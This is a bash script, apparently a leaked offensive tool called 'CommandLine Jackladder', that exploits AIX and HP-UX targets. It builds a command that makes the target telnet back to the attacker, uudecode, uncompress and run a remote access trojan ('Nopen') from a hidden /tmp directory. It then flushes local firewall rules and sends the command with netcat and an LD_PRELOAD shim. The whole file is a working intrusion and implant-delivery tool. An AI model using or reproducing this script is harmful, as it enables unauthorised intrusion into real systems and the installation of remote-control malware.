#!/bin/bash
PROG=`basename $0`
echo -e "\n\n\n\n\nWelcome to CommandLine Jackladder\n\n$PROG Command Line Used: $PROG $*"
VER=1.2.0.7

usage ()
{
echo "Usage: ${0}
Required Options:
	-l [ IP of attack machine ]
	-t [ IP of target machine (actual target IP, NOT 127.0.0.1) ]
	-r [ name of rat on target ]

Other Options:
	-p [ port jack is listening on (if no -p, DEFAULT=32676) ]
	-u [ Upload port for Nopen (if no -u, DEFAULT=80) ]
	-s [ Special Source port (if no -s, DEFAULT=16798, must be from below list) ]
	-c [ Nopen Callback port (if no -c, will be in listen mode) ]
	-n [ Nopen listenport (if no -c and no -n, DEFAULT=32754) ]
	-d [ directory to work from/create on target (if no -d, DEFAULT=/tmp/.X11R6) ]
	-i [ local redirector IP (if no -i and -R, DEFAULT=127.0.0.1) ]
	-R [ turn off redirection (better think before using this) ]
	-C [ use /dev/console trick for holding open telnet stdin instead of sleep ]"

echo ""
echo "Special source ports are 3, 51, 8213, 12634, 16798, 23247"
echo ""
echo "callback on 10002"
echo " Example ${0} -l 555.1.9.2 -t 555.1.2.185 -r sendmail -u 81 -s 16798 -c 10002 -d /tmp/.scsi"
echo "callin on 32754"
echo " Example ${0} -l 555.1.9.2 -t 555.1.2.185 -r sendmail -u 81 -s 16798 -n 32754 -d /tmp/.scsi"
echo ""
echo "HP-UX Jackladder should use -C, AIX should not use -C"
echo ""
echo "$0 v.$VER"
echo ""
}

LOCAL_IP=0
TARGET_IP=0
TUNNEL_IP=127.0.0.1
RAT=0
REDIRECT=1
DEVCONSOLE=0
CALLBACK_PORT=0
DIR=/tmp/.X11R6
SOURCE_PORT=16798
DEST_PORT=32676
UPLOAD_PORT=80
LISTEN_PORT=0

# Must be enough cmdline args
if [ $# -lt 4 ]; then
	usage
	exit 1
fi

# Parse cmdline args
while getopts hl:t:p:u:s:r:d:n:c:i:RC optvar
do
	case "$optvar" in
 	h) usage; exit 1;;
	l) LOCAL_IP="${OPTARG}";;
	t) TARGET_IP="${OPTARG}";;
	r) RAT="${OPTARG}";;
	p) DEST_PORT="${OPTARG}";;
	u) UPLOAD_PORT="${OPTARG}";;
	s) SOURCE_PORT="${OPTARG}";;
	c) CALLBACK_PORT="${OPTARG}";;
	n) LISTEN_PORT="${OPTARG}";;
	d) DIR="${OPTARG}";;
	i) TUNNEL_IP="${OPTARG}";;
	R) REDIRECT="0";;
	C) DEVCONSOLE="1";;
	*) echo "invalid option"; usage; exit 1;;
	esac
done

# Make sure we either have listen or callback 
if [ ${CALLBACK_PORT} != 0 ]; then
	if [ ${LISTEN_PORT} != 0 ]; then
		echo "You can not both listen and callback"
		exit
	fi
else
	if [ ${LISTEN_PORT} = 0 ]; then
		LISTEN_PORT=32754
	fi
fi

# Need IP to call back to
if [ ${LOCAL_IP} = 0 ]; then
    echo "Local IP is not set"
    exit
fi

# Target IP (not localhost, this is for tunnel pastable)
if [ ${TARGET_IP} = 0 ]; then
    echo "Target IP is not set"
    exit
fi

# Rat name
if [ ${RAT} = 0 ]; then
    echo "Rat name is not set"
    exit
fi

# Make pastables and commands go direct
if [ ${REDIRECT} = 0 ]; then
    echo "You have decided to turn off redirection.  You better be sure before"
    echo "you do this.  This will go directly to the target IP."
    echo -n "Are you sure? (Y/N): "
    read AREYOUSURE
    if [ `echo ${AREYOUSURE} | grep -i "^y"` ]
    then
        TUNNEL_IP=${TARGET_IP}
    else
        echo "You are apparently not sure...bailing."
        exit
    fi
fi

# Print out info, pastable, and create target command set
echo ""
echo "########################################"
echo "Local IP = ${LOCAL_IP}"
echo "Target IP = ${TARGET_IP}"
echo "Tunnel IP = ${TUNNEL_IP}"
echo "Target PORT = ${DEST_PORT}"
echo "Upload Port = ${UPLOAD_PORT}"
echo "Source Port = ${SOURCE_PORT}"
echo "Name of Rat = ${RAT}"
if [ ${CALLBACK_PORT} != 0 ]; then
	echo "Nopen calling back to = ${CALLBACK_PORT}"
else
	echo "Nopen will listen on = ${LISTEN_PORT}"
fi
echo "Directory to create/use = ${DIR}"

if [ $DEVCONSOLE = 0 ]; then
	TELNETCMD="sleep 120 | telnet ${LOCAL_IP} ${UPLOAD_PORT}"
else
	TELNETCMD="telnet ${LOCAL_IP} ${UPLOAD_PORT} < /dev/console"
fi

if [ ${CALLBACK_PORT} = 0 ]; then
	NOPENENV="D=-l${LISTEN_PORT}"
else
	NOPENENV="D=-c${LOCAL_IP}:${CALLBACK_PORT}"
fi

JL_COMMAND="PATH=.:/bin:/usr/bin:/sbin:/usr/sbin:/usr/ucb; export PATH; TERM=vt100;export TERM;mkdir ${DIR} 2>&1;cd ${DIR} 2>&1 && ${TELNETCMD} 2>&1 | egrep -v 'Try|Conn|Esca' |uudecode && uncompress -f ${RAT}.Z && chmod 0700 ${RAT} && ${NOPENENV} ${RAT}"

echo ""
echo "The command is ${JL_COMMAND}"
echo "########################################"
echo ""
echo ""

echo " Your netcat line for uploading AIX Nopen:"
echo " cd /current/up; packrat ${RAT} /current/up/noserver-aix ${UPLOAD_PORT}"
echo ""
echo " Your netcat line for uploading HP-UX Nopen:"
echo " cd /current/up; packrat ${RAT} /current/up/noserver-hpux ${UPLOAD_PORT}"
echo ""

if [ ${CALLBACK_PORT} != 0 ]; then
   echo "Setup for the nopen callback"
   echo "-nrtun ${CALLBACK_PORT}"
   echo
   echo "OR"
   echo
   echo "noclient -l ${CALLBACK_PORT}"
else
   echo "Connect to nopen with"
   echo "-nstun ${TARGET_IP}:${LISTEN_PORT}"
   echo
   echo "OR"
   echo
   echo "noclient ${TUNNEL_IP}:${LISTEN_PORT}"
fi

if [ ${TUNNEL_IP} = "127.0.0.1" ]; then
   echo ""
   echo ""
   echo "### Tunnel Command is:"
   echo "-tunnel"
   echo "l ${DEST_PORT} ${TARGET_IP} ${DEST_PORT} ${SOURCE_PORT}"
   echo "r ${UPLOAD_PORT}"
fi

FWRULES=/current/bin/fwrules.py
FULES_SAVE_FILE=/current/tmp/aixjack_`date +"%s"`_saved_rules

echo
echo
echo "### If you ^C the script, restore the local firewall rules manually:"
echo "${FWRULES} -R ${FULES_SAVE_FILE}"
echo
echo
echo "Hit return when you are ready"

read blah;


echo "Saving the current firewall rules and then flushing"
echo ${FWRULES} -S ${FULES_SAVE_FILE} -F
${FWRULES} -S ${FULES_SAVE_FILE} -F

# Bombs away...
echo
echo LD_PRELOAD=/current/bin/connect.so CMD=\"${JL_COMMAND}\" RA=${LOCAL_IP} RP=${SOURCE_PORT} nc -p ${SOURCE_PORT} ${TUNNEL_IP} ${DEST_PORT}
LD_PRELOAD=/current/bin/connect.so CMD="${JL_COMMAND}" RA=${LOCAL_IP} RP=${SOURCE_PORT} nc -p ${SOURCE_PORT} ${TUNNEL_IP} ${DEST_PORT}

echo
echo "Restoring firewall rules"
echo ${FWRULES} -R ${FULES_SAVE_FILE}
${FWRULES} -R ${FULES_SAVE_FILE}
